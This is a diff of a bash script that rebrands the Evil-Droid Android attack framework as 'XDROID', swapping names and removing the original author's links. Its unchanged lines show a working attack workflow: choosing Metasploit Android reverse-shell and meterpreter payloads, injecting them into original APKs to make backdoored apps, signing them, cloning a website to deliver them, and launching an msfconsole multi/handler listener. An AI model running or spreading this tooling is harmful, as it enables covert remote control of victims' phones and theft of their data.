@@ -1,12 +1,10 @@
 #!/usr/bin/env bash
 #
 # XDROID Framework . version 0.3
-# Evil-Droid is a framework that create & generate & embed apk payload to penetrate android platform
+# XDROID is a framework that create & generate & embed apk payload to penetrate android platform
 # 
-#                  Develope By Demauye .
+#                     Develope By BabyPunk .
 #                         Website: XXXXX
-#           YTB : https://www.youtube.com/c/mascerano%20bachir  
-#        FCB : https://www.facebook.com/kali.linux.pentesting.tutorials
 #Speciak thanks to : MrPedroubuntu , Kader Achraf , youcef yahia and Mohammed Yacine
 #
 # 
@@ -44,7 +42,7 @@ function checkinternet()
     echo
     echo -e $red "This Script Needs An Active Internet Connection"
     echo
-    echo -e $yellow " Evil-Droid Exit"
+    echo -e $yellow " XDROID Exit"
     echo && sleep 2
     exit
   else
@@ -93,7 +91,7 @@ apache_svc_stop
 postgresql_stop
 sleep 1
 echo ""
-echo -e $yellow"[*] Thanks For Using Evil-Droid  :)"
+echo -e $yellow"[*] Thanks For Using XDROID  :)"
 exit
 }
 #detect system
@@ -259,11 +257,11 @@ function get_lport()
 #function payload
 function get_payload()
 {
-  PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
+  PAYLOAD=$(zenity --list --title "☢ XDROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
 }
 function get_payload1()
 {
-  PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 400 --height 400 2> /dev/null)
+  PAYLOAD=$(zenity --list --title "☢ XDROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 400 --height 400 2> /dev/null)
 }
 #function name
 function payload_name()
@@ -636,7 +634,7 @@ function quests()
 {
 while true; do
    echo ""
-   quest=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Choose payload apk or original apk?" --radiolist --column "Choose" --column "Option" TRUE "APK-MSF" FALSE "ORIGINAL-APK" --width 305 --height 270 2> /dev/null) 
+   quest=$(zenity --list --title "☢ XDROID OPTIONS ☢" --text "Choose payload apk or original apk?" --radiolist --column "Choose" --column "Option" TRUE "APK-MSF" FALSE "ORIGINAL-APK" --width 305 --height 270 2> /dev/null) 
    case $quest in
    APK-MSF) change_icon;spinlong;gen_payload;spinlong;apk_decomp;flagg;merge_name_ico;spinlong;apk_comp;spinlong;sign;return;;
    ORIGINAL-APK) orig_apk;spinlong;gen_payload;spinlong;up_apktook;apk_decomp1;spinlong;apk_decomp;flagg_original;spinlong;apk_comp1;spinlong;sign;return;;
@@ -646,7 +644,7 @@ done
 #function listeners
 function listener()
 {
-  xterm -T "EVIL-DROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
+  xterm -T "XDROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
 }
 #function clone site
 function clns()
@@ -678,7 +676,7 @@ function atkv()
 {
 while true; do
    echo ""
-   atk_v=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Choose an option bellow:" --radiolist --column "Choose" --column "Option" TRUE "Multi-Handler" FALSE "Attack-Vector" FALSE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
+   atk_v=$(zenity --list --title "☢ XDROID OPTIONS ☢" --text "Choose an option bellow:" --radiolist --column "Choose" --column "Option" TRUE "Multi-Handler" FALSE "Attack-Vector" FALSE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
    case $atk_v in
    Multi-Handler) listener;suite;;
    Attack-Vector) clns;spinlong;index_name;launcher;listener;suite;;
@@ -692,7 +690,7 @@ function suite()
 {
 while true; do
    echo ""
-   suit=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Would you like to continue?" --radiolist --column "Choose" --column "Option" TRUE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
+   suit=$(zenity --list --title "☢ XDROID OPTIONS ☢" --text "Would you like to continue?" --radiolist --column "Choose" --column "Option" TRUE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
    case $suit in
    Main-Menu) clear;main;;
    Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Good Bye !!";echo "";exit;;
@@ -708,7 +706,7 @@ function clean()
  rm /var/www/html/*.apk > /dev/null 2>&1
  rm /var/www/html/$index.html > /dev/null 2>&1
 }      
-start=$(zenity --question --title="☢ Evil-Droid Framework ☢" --text "Execute framework and Services?" --width 270 2> /dev/null)
+start=$(zenity --question --title="☢ XDROID Framework ☢" --text "Execute framework and Services?" --width 270 2> /dev/null)
   if [ "$?" -eq "0" ]; then
     apache_svc_start
     postgresql_start
@@ -717,7 +715,7 @@ start=$(zenity --question --title="☢ Evil-Droid Framework ☢" --text "Execute
     echo ""
     echo -e $lightgreen "╔──────────────────────────────────────────────╗"
     echo -e $lightgreen "|           Author: Mascerano Bachir           |"
-    echo -e $lightgreen "|    Evil-Droid Framework $ver - Dev-labs.co   |"
+    echo -e $lightgreen "|    XDROID Framework $ver - Dev-labs.co   |"
     echo -e $lightgreen "|   Credits to : MrPedroubuntu , Kader Achraf  |"
     echo -e $lightgreen "|               , youcef yahia                 |"
     echo -e $lightgreen "|              and Mohammed Yacine             |"
@@ -737,7 +735,7 @@ function main()
         print_ascii_art
         echo -e $green ""
         echo "╔──────────────────────────────────────────────╗"
-        echo "|          Evil-Droid Framework $ver           |"
+        echo "|          XDROID Framework $ver           |"
         echo "|      Hack & Remote android plateform         |"
         echo "┖──────────────────────────────────────────────┙"
         echo "[1] APK MSF                                     "
@@ -765,7 +763,7 @@ function main()
                 error0
                 sleep 2
                 echo ""
-                zenity --title "☢ EVIL-DROID ☢" --info --text "APK PAYLOAD : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
+                zenity --title "☢ XDROID ☢" --info --text "APK PAYLOAD : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                 atkv
                 echo
                 ;;
@@ -787,7 +785,7 @@ function main()
                 error
                 sleep 2
                 echo ""
-                zenity --title "☢ EVIL-DROID ☢" --info --text "BACKDOORED APK : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
+                zenity --title "☢ XDROID ☢" --info --text "BACKDOORED APK : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                 atkv 
                 echo
                 ;;
@@ -816,7 +814,7 @@ function main()
                 error
                 sleep 2
                 echo ""
-                zenity --title "☢ EVIL-DROID ☢" --info --text "BACKDOORED APK : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
+                zenity --title "☢ XDROID ☢" --info --text "BACKDOORED APK : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                 atkv 
                 echo
                 ;;
@@ -833,7 +831,7 @@ function main()
                 error
                 sleep 2
                 echo 
-                zenity --title "☢ EVIL-DROID ☢" --info --text "APK SIGNED : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
+                zenity --title "☢ XDROID ☢" --info --text "APK SIGNED : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                 atkv 
                 echo
                 ;;
@@ -852,7 +850,7 @@ function main()
                 echo
                 clean
                 echo
-                zenity --title "☢ EVIL-DROID ☢" --info --text "All Files Are Removed " --width 400 > /dev/null 2>&1
+                zenity --title "☢ XDROID ☢" --info --text "All Files Are Removed " --width 400 > /dev/null 2>&1
                 echo
                 clear
                 ;;
